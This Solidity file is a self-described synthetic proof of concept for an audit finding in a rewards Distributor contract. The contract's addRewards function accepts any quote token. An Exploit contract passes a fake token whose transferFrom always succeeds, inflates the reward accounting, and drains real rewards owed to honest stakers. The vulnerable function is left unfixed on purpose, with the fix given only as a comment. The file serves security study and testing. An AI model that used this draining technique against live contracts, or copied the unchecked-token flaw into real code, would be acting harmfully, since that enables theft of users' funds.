// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    GTE — Distributor addRewards accepts arbitrary quoteToken → drain rewards
    (Code4rena 2025-08-gte-perps-and-launchpad, finding #64854 / H-06)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: addRewards does not check that the provided quote side matches
    the pool's registered quoteAsset. An attacker passes a fake token as
    token1, transferFrom succeeds on the fake, but pendingQuoteRewards is
    inflated against the real quote pool. A staker then claims real quote
    tokens that were never deposited for that inflation.

    Blamed path: Distributor.sol L106-L132 @ f43e1eed (addRewards).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Malicious "quote" that always reports successful transferFrom without
///      moving the real quote balances (attacker supplies this as token1).
contract FakeQuote {
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }
}

/// @dev Minimal Distributor + reward pool (single launch asset).
contract Distributor {
    uint256 public constant PRECISION = 1e12;

    address public launchAsset;
    address public quoteAsset; // real registered quote

    uint256 public totalShares;
    uint256 public pendingQuoteRewards;
    uint256 public accQuoteRewardPerShare;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public quoteRewardDebt;
    mapping(address => uint256) public totalPending; // token => pending accounting

    function createRewardsPair(address launch, address quote) external {
        require(quoteAsset == address(0), "exists");
        launchAsset = launch;
        quoteAsset = quote;
    }

    function increaseStake(address account, uint256 s) external {
        require(launchAsset != address(0), "no pool");
        _update();
        if (shares[account] > 0) {
            // settle is skipped for seed simplicity when debt is set after
        }
        shares[account] += s;
        totalShares += s;
        quoteRewardDebt[account] = (shares[account] * accQuoteRewardPerShare) / PRECISION;
    }

    /// @notice Allows rewards to be added to a pool regardless of token order
    /// @dev Pools can only be created once per asset combo, regardless of the order of the assets
    /// Additionally, anyone can add rewards as incentive, even while a pair is still bonding
    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        (address launchAsset_, address quoteAsset_, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
            (token0, token1, amount0, amount1);
        // simplified: only look up by token0 == launchAsset
        require(token0 == launchAsset || token1 == launchAsset, "RewardsDoNotExist");
        if (token0 != launchAsset) {
            (launchAsset_, quoteAsset_, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
        }

        if (totalShares == 0) revert("NoSharesToIncentivize");

        if (launchAssetAmount > 0) {
            // not used in this PoC
            launchAssetAmount;
        }

        if (quoteAssetAmount > 0) {
            // @> VULN: no validation that quoteAsset_ == registered quoteAsset
            pendingQuoteRewards += quoteAssetAmount;
            totalPending[quoteAsset_] += quoteAssetAmount;
            // pulls from msg.sender on the PROVIDED quoteAsset_ (may be a fake token)
            require(MockERC20(quoteAsset_).transferFrom(msg.sender, address(this), uint256(quoteAssetAmount)), "tf");
            // FIX: require(quoteAsset_ == quoteAsset, "bad quote");
        }
        launchAsset_; // silence
    }

    function claimRewards(address /*launch*/) external returns (uint256 baseAmount, uint256 quoteAmount) {
        _update();
        uint256 userShares = shares[msg.sender];
        require(userShares > 0, "no shares");
        uint256 accumulated = (userShares * accQuoteRewardPerShare) / PRECISION;
        quoteAmount = accumulated - quoteRewardDebt[msg.sender];
        baseAmount = 0;
        if (quoteAmount > 0) {
            quoteRewardDebt[msg.sender] = accumulated;
            // pays out REAL registered quoteAsset
            require(MockERC20(quoteAsset).transfer(msg.sender, quoteAmount), "pay");
            if (totalPending[quoteAsset] >= quoteAmount) totalPending[quoteAsset] -= quoteAmount;
        }
    }

    function _update() internal {
        if (totalShares == 0 || pendingQuoteRewards == 0) return;
        accQuoteRewardPerShare += (pendingQuoteRewards * PRECISION) / totalShares;
        pendingQuoteRewards = 0;
    }
}

contract Exploit {
    MockERC20 public launch; // CREATE 1
    MockERC20 public realQuote; // CREATE 2
    FakeQuote public fake; // CREATE 3
    Distributor public dist; // CREATE 4 — vulnerable

    uint256 public stolen;

    constructor() {
        launch = new MockERC20("Launch", "LNCH");
        realQuote = new MockERC20("USDC", "USDC");
        fake = new FakeQuote();
        dist = new Distributor();
        dist.createRewardsPair(address(launch), address(realQuote));
    }

    function run() external {
        // Honest rewards already in the distributor (victim LP rewards)
        uint256 honestRewards = 10_000e18;
        realQuote.mint(address(dist), honestRewards);

        // Attacker has a small stake so they can claim inflated rewards
        dist.increaseStake(address(this), 100);

        // Honest user also staked heavily (victim) — their share of real rewards
        // is diluted / drained when attacker inflates then claims.
        dist.increaseStake(address(0xA11CE), 100);

        // Inflate pendingQuoteRewards massively via fake token1 — no real USDC moves
        // amount1 huge relative to stake
        uint128 fakeAmount = 10_000e18; // claim the whole pot
        // FakeQuote.transferFrom always succeeds; pendingQuoteRewards += fakeAmount
        dist.addRewards(address(launch), address(fake), 0, fakeAmount);

        uint256 before = realQuote.balanceOf(address(this));
        dist.claimRewards(address(launch));
        stolen = realQuote.balanceOf(address(this)) - before;

        // Attacker owns 100/200 shares → half of inflated rewards = 5000
        // which drains real USDC that was meant for honest stakers
        require(stolen > 0, "harm not demonstrated");
        require(stolen >= 4_000e18, "did not drain significant real quote rewards");
    }
}
